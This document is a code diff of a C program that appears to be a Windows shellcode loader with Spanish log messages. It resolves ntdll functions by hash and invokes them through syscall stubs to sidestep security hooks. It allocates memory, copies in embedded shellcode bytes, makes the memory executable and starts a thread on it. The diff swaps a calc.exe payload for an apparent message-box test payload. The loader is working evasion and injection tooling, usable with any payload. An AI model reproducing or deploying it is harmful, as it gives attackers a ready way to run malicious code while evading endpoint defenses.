@@ -142,14 +142,13 @@ PVOID CopyMem(PVOID dest, const PVOID src, SIZE_T len)
 }
 
 
-
 // Entry Point
 int main()
 {
-
     PTEB pCurrentTeb = GetEnvironmentThreadBlock();
-
     PPEB pCurrentPeb = pCurrentTeb->ProcessEnvironmentBlock;
+    
+    NTSTATUS status;
 
     if (!pCurrentTeb || !pCurrentPeb || pCurrentPeb->OSMajorVersion != 0xA)
     {
@@ -159,7 +158,7 @@ int main()
 
     print("[+] Replicando chido");
 
-    // Get Ntddl module 
+    // Get Ntdll module 
     PLDR_DATA_TABLE_ENTRY pLdrDataEntry = (PLDR_DATA_TABLE_ENTRY)((PBYTE)pCurrentPeb->LoaderData->InMemoryOrderModuleList.Flink->Flink - 0x10);
 
     PIMAGE_EXPORT_DIRECTORY pImageExportDirectory = NULL;
@@ -172,80 +171,57 @@ int main()
 
     print("[+] Se obtuvo modulo de NTDLL");
 
+    // Functions to export
+    FUNC_VAL firstFunction = { 0 };   // NtAllocateVirtualMemory
+    FUNC_VAL secondFunction = { 0 };  // NtProtectVirtualMemory
+    FUNC_VAL thirdFunction = { 0 };   // NtFreeVirtualMemory
+    FUNC_VAL fourthFunction = { 0 };  // NtCreateThreadEx
+    FUNC_VAL fifthFunction = { 0 };   // NtWaitForSingleObject
 
-    //
-    //  Functions to export
-    //
-    FUNC_VAL firstFunction = { 0 };
-    FUNC_VAL secondFunction = { 0 };
-    FUNC_VAL thirdFunction = { 0 };
+    firstFunction.magic_number = 0x6793c34c;   // NtAllocateVirtualMemory
+    secondFunction.magic_number = 0x82962c8;   // NtProtectVirtualMemory
+    thirdFunction.magic_number = 0x471aa7e9;   // NtFreeVirtualMemory
+    fourthFunction.magic_number = 0xcb0c2130;  // NtCreateThreadEx
+    fifthFunction.magic_number = 0x4c6dc63c;   // NtWaitForSingleObject
 
-    // NtAllocateVirtualMemory
-    firstFunction.magic_number = 0x6793c34c;
-
-    // NtProtectVirtualMemory
-    secondFunction.magic_number = 0x82962c8;
-
-    // NtFreeVirtualMemory
-    thirdFunction.magic_number = 0x471aa7e9;
-
-    // NtCreateThreadEx 
-    //thirdFunction.magic_number = 0x376e0713;
-
-    // Get NtAllocateVirtualMemory
+    // Get functions
     GetFunctionFrom(pLdrDataEntry->DllBase, pImageExportDirectory, &firstFunction);
-
-    // Get NtProtectVirtualMemory
     GetFunctionFrom(pLdrDataEntry->DllBase, pImageExportDirectory, &secondFunction);
-
-    // Get NtFreeVirtualMemory
     GetFunctionFrom(pLdrDataEntry->DllBase, pImageExportDirectory, &thirdFunction);
+    GetFunctionFrom(pLdrDataEntry->DllBase, pImageExportDirectory, &fourthFunction);
+    GetFunctionFrom(pLdrDataEntry->DllBase, pImageExportDirectory, &fifthFunction);
 
-    //
-    //  Start process
-    //
+    // Payload (calc.exe para pruebas)
+    unsigned char payload[] =
+        "\xfc\x48\x81\xe4\xf0\xff\xff\xff\xe8\xcc\x00\x00\x00\x41"
+        "\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60"
+        "\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x4d\x31"
+        "\xc9\x48\x0f\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02"
+        "\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51"
+        "\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18"
+        "\x0b\x02\x0f\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00"
+        "\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x44\x8b\x40\x20\x49"
+        "\x01\xd0\x8b\x48\x18\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88"
+        "\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\x41\xc1\xc9\x0d\xac"
+        "\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39"
+        "\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b"
+        "\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48"
+        "\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41"
+        "\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48"
+        "\x8b\x12\xe9\x4b\xff\xff\xff\x5d\xe8\x0b\x00\x00\x00\x75"
+        "\x73\x65\x72\x33\x32\x2e\x64\x6c\x6c\x00\x59\x41\xba\x4c"
+        "\x77\x26\x07\xff\xd5\x49\xc7\xc1\x00\x00\x00\x00\xe8\x05"
+        "\x00\x00\x00\x48\x6f\x6c\x61\x00\x5a\xe8\x05\x00\x00\x00"
+        "\x54\x65\x73\x74\x00\x41\x58\x48\x31\xc9\x41\xba\x45\x83"
+        "\x56\x07\xff\xd5\x48\x31\xc9\x41\xba\xf0\xb5\xa2\x56\xff"
+        "\xd5";
 
-    // For the status
-    NTSTATUS status = 0;
-
-    // Payload
-    BYTE payload[] = {
-        0xfc, 0x48, 0x83, 0xe4, 0xf0, 0xe8, 0xc0, 0x00, 0x00, 0x00, 0x41, 0x51,
-        0x41, 0x50, 0x52, 0x51, 0x56, 0x48, 0x31, 0xd2, 0x65, 0x48, 0x8b, 0x52,
-        0x60, 0x48, 0x8b, 0x52, 0x18, 0x48, 0x8b, 0x52, 0x20, 0x48, 0x8b, 0x72,
-        0x50, 0x48, 0x0f, 0xb7, 0x4a, 0x4a, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
-        0xac, 0x3c, 0x61, 0x7c, 0x02, 0x2c, 0x20, 0x41, 0xc1, 0xc9, 0x0d, 0x41,
-        0x01, 0xc1, 0xe2, 0xed, 0x52, 0x41, 0x51, 0x48, 0x8b, 0x52, 0x20, 0x8b,
-        0x42, 0x3c, 0x48, 0x01, 0xd0, 0x8b, 0x80, 0x88, 0x00, 0x00, 0x00, 0x48,
-        0x85, 0xc0, 0x74, 0x67, 0x48, 0x01, 0xd0, 0x50, 0x8b, 0x48, 0x18, 0x44,
-        0x8b, 0x40, 0x20, 0x49, 0x01, 0xd0, 0xe3, 0x56, 0x48, 0xff, 0xc9, 0x41,
-        0x8b, 0x34, 0x88, 0x48, 0x01, 0xd6, 0x4d, 0x31, 0xc9, 0x48, 0x31, 0xc0,
-        0xac, 0x41, 0xc1, 0xc9, 0x0d, 0x41, 0x01, 0xc1, 0x38, 0xe0, 0x75, 0xf1,
-        0x4c, 0x03, 0x4c, 0x24, 0x08, 0x45, 0x39, 0xd1, 0x75, 0xd8, 0x58, 0x44,
-        0x8b, 0x40, 0x24, 0x49, 0x01, 0xd0, 0x66, 0x41, 0x8b, 0x0c, 0x48, 0x44,
-        0x8b, 0x40, 0x1c, 0x49, 0x01, 0xd0, 0x41, 0x8b, 0x04, 0x88, 0x48, 0x01,
-        0xd0, 0x41, 0x58, 0x41, 0x58, 0x5e, 0x59, 0x5a, 0x41, 0x58, 0x41, 0x59,
-        0x41, 0x5a, 0x48, 0x83, 0xec, 0x20, 0x41, 0x52, 0xff, 0xe0, 0x58, 0x41,
-        0x59, 0x5a, 0x48, 0x8b, 0x12, 0xe9, 0x57, 0xff, 0xff, 0xff, 0x5d, 0x48,
-        0xba, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8d, 0x8d,
-        0x01, 0x01, 0x00, 0x00, 0x41, 0xba, 0x31, 0x8b, 0x6f, 0x87, 0xff, 0xd5,
-        0xbb, 0xf0, 0xb5, 0xa2, 0x56, 0x41, 0xba, 0xa6, 0x95, 0xbd, 0x9d, 0xff,
-        0xd5, 0x48, 0x83, 0xc4, 0x28, 0x3c, 0x06, 0x7c, 0x0a, 0x80, 0xfb, 0xe0,
-        0x75, 0x05, 0xbb, 0x47, 0x13, 0x72, 0x6f, 0x6a, 0x00, 0x59, 0x41, 0x89,
-        0xda, 0xff, 0xd5, 0x63, 0x61, 0x6c, 0x63, 0x2e, 0x65, 0x78, 0x65, 0x00
-    };
-
-    //
-    //  Values for the memory allocation
-    //
     PVOID pAddr = NULL;
     SIZE_T payload_size = sizeof(payload);
     SIZE_T real_size = payload_size;
     ULONG ulOldProtect = 0;
 
-    //
-    //  Start With the read write memory allocation
-    //
+    // Allocate memory
     print("[*] Asignando memoria RW...");
     SetCall(firstFunction.call_number);
     status = CallFunc((HANDLE)-1, &pAddr, 0, &payload_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -256,29 +232,18 @@ int main()
         return -1;
     }
 
-    if (!pAddr)
-    {
-        print("[-] No se obtuvo memoria");
-    }
-
     print("[+] Memoria asignada en: 0x%p", pAddr);
-    print("[+] Size: %zu bytes", payload_size);
+    print("[+] Size: %zu bytes", real_size);
 
-
-    //
-    //  Read Write Memory
-    //
+    // Copy payload
     print("[*] Copiando payload...");
     CopyMem(pAddr, (PVOID)payload, real_size);
     print("[+] Payload copiado");
 
-
-    //
-    //  Changing permissions from the memory region
-    //
+    // Change permissions
     print("[*] Cambiando permisos a RX...");
     SetCall(secondFunction.call_number);
-    status = CallFunc((HANDLE)-1, &pAddr, &payload_size, PAGE_EXECUTE_READ, &ulOldProtect);
+    status = CallFunc((HANDLE)-1, &pAddr, &real_size, PAGE_EXECUTE_READ, &ulOldProtect);
 
     if (status != 0)
     {
@@ -288,26 +253,84 @@ int main()
 
     print("[+] Permisos cambiados exitosamente");
 
-    print("[*] Ejecutando payload...");
-    ((void(*)())pAddr)();
-    print("[+] Payload ejecutado");
+    // CORRECCIÓN: Crear hilo remoto correctamente
+    HANDLE hHostThread = NULL;
+    DWORD dwThreadId = 0;
 
-    //
-    // Free memory
-    //
+    print("[*] Creando hilo remoto...");
 
-    SIZE_T free_size = 0;
+    
+    SetCall(fourthFunction.call_number);
 
-    print("[*] Liberando memoria...");
-    SetCall(thirdFunction.call_number);
-    status = CallFunc((HANDLE)-1, &pAddr, &free_size, MEM_RELEASE);
+        // NtCreateThreadEx tiene 11 parámetros
+        // NTSTATUS NtCreateThreadEx(
+        //   PHANDLE ThreadHandle,
+        //   ACCESS_MASK DesiredAccess,
+        //   POBJECT_ATTRIBUTES ObjectAttributes,
+        //   HANDLE ProcessHandle,
+        //   LPTHREAD_START_ROUTINE lpStartAddress,
+        //   LPVOID lpParameter,
+        //   ULONG CreateFlags,
+        //   SIZE_T ZeroBits,
+        //   SIZE_T StackSize,
+        //   SIZE_T MaximumStackSize,
+        //   PPS_ATTRIBUTE_LIST AttributeList
+        // );
 
-    if (status != 0)
-    {
-        print("[-] Error en NtFreeVirtualMemory: 0x%08X", status);
+    status = CallFunc(&hHostThread,
+        THREAD_ALL_ACCESS,
+        NULL,
+        (HANDLE)-1,  // Current process
+        pAddr,       // Start routine
+        NULL,        // Parameter
+        FALSE,       // Create suspended?
+        0,           // Zero bits
+        0,           // Stack size
+        0,           // Max stack size
+        NULL);       // Attribute list
+
+    if (status != 0) {
+        print("[-] Error en NtCreateThreadEx: 0x%08X", status);
         return -1;
     }
+    
+    print("[+] Hilo creado (handle: 0x%p)", hHostThread);
 
-    print("[+] Memoria liberada %lld", free_size);
-    print("[+] Programa finalizado correctamente");
+    // Wait for thread completion
+    print("[*] Esperando a que termine el hilo...");
+    SetCall(fifthFunction.call_number);
+    LARGE_INTEGER timeout;
+    timeout.QuadPart = -10000000;  // 1 segundo
+
+    status = CallFunc(hHostThread, FALSE, &timeout);
+
+    if (status == 0x102) {  // STATUS_TIMEOUT
+        print("[!] Timeout - el hilo sigue ejecutandose");
+    }
+    else if (status != 0) {
+        print("[-] Error en NtWaitForSingleObject: 0x%08X", status);
+    }
+    else {
+        print("[+] Hilo terminado exitosamente");
+    }
+
+    // Cleanup
+    CloseHandle(hHostThread);
+
+    // Free memory
+    print("[*] Liberando memoria...");
+    SetCall(thirdFunction.call_number);
+    SIZE_T free_size = 0;
+    status = CallFunc((HANDLE)-1, &pAddr, &free_size, MEM_RELEASE);
+
+    if (status != 0) {
+        print("[-] Error liberando memoria: 0x%08X", status);
+    }
+    else {
+        print("[+] Memoria liberada exitosamente");
+    }
+
+    print("[+] Programa finalizado");
+
+    return 0;
 }
